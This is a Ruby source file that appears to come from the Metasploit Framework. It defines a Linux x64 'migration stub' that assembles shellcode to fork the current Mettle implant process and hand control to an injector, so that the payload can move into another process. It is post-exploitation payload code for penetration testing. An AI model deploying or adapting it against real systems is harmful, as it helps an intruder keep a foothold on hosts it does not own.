# -*- coding: binary -*-
# frozen_string_literal: true

module Msf
  # Payload that supports migration on x64.
  module Payload::Linux::X64::Migrate
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Linux Migration (x64)',
          'Description' => 'Migration stub x64',
          'Author' => ['Rapid7'],
          'License' => MSF_LICENSE,
          'Platform' => 'linux',
          'Arch' => ARCH_X64
        )
      )
    end

    #
    # Constructs the migrate stub on the fly.
    #
    def generate(opts = {})
      # rax - payload address
      # rbx - pid of the current Mettle process
      # rcx - file descriptor of the current transport
      asm = %(
      push rax
      push rcx
      push rbx
      mov rax, 57
      syscall                   ; fork()
      test rax, rax
      jz migrate_child
      int 3                    ; let the injector restore and resume the target

    migrate_child:
      #{generate_migrate(opts)}
    )

      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
    end
  end
end
